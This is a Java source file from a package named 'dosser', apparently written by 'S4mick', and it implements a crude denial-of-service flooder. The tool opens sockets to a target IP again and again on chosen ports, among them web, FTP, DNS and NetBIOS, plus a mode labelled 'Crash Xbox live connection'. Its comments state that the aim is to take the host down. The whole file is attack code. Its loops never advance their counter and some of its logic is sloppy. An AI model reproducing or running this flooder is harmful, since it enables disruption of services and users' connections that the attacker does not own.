package s4mick.dosser;
import java.io.*;
import java.lang.*;
import java.net.*;
import java.util.Random;

/**     ..1 80/443  ..2 443/21 ..3 random ..4 3074   ..5 53/139
 *
 * @author S4mick
 */
public class Client implements Runnable {
    String IP;
    int Porta;
    
    
    
    Client(String IndirizzoIP,int Porta){
    IP=IndirizzoIP;
    this.Porta=Porta;
    }
   

    @Override
    public void run() {
         int i=1;
    try {
         Socket client = new Socket(IP, 80);
         int riga=0;
              switch(Porta){
             case 1: System.out.println("Mode: HTTP e HTTPS --- > mixed\n");
                    while(i<1000){
                     
                        client = new Socket(IP, 80);
                        client.bind(new InetSocketAddress(IP, 80));  //bind it's self the ip.. its a test feature but it seems to work..
                       client = new Socket(IP, 443);
                       
                        riga++;
                               if(riga%50==0)System.out.print("*\n");  //go to new line every 50 chars
                               else  System.out.print("*");
                       client.sendUrgentData(1337);
                         }
                   break;  
             case 2: System.out.println("Mode: HTTPS e FTP --- > secure requests flood\n");
                while(i<1000){
                     
                       client = new Socket(IP, 21);
                      // client.bind(new InetSocketAddress(IP, 21));
                       client = new Socket(IP, 443);
                      // client.bind(new InetSocketAddress(IP, 443));
                        riga++;
                               if(riga%50==0)System.out.print("*\n");  //ogni 50 caratteri va a capo
                               else  System.out.print("*");
                       client.sendUrgentData(1337);
                         }
                     break;
             case 3: System.out.println("Mode: Random Ports\n");
             Random random = new Random();
             int n1=random.nextInt(),n2=random.nextInt();
             while(i<1000){
               client = new Socket(IP,n1);
              
               client = new Socket(IP,n2);
                client.close(); // why close connection if we need to take down that host ? xD
               riga++;
         System.out.print("n1:n2"+n1+":"+n2);  
         
             }
                     break;
             case 4: System.out.println("Mode: Crash Xbox live connection\n");
                     while(i<1000){
                       client = new Socket(IP, 3074);
                       client = new Socket(IP, 3074);
                     }
                     break;
             case 5: System.out.println("Mode: DNS e NETAPI \n");
              while(i<1000){
                       client = new Socket(IP, 53);
                       client = new Socket(IP, 139);
                        riga++;
                               if(riga%50==0)System.out.print("*\n");  //ogni 50 caratteri va a capo
                               else  System.out.print("*");
                     }
                     break;
                
              }
       
    }
         catch(Exception e) {System.out.println("Connection failed or host seems down from there ---> dentro metodo client.run()");}
   
   
      
         
      }
      
        
        
    }

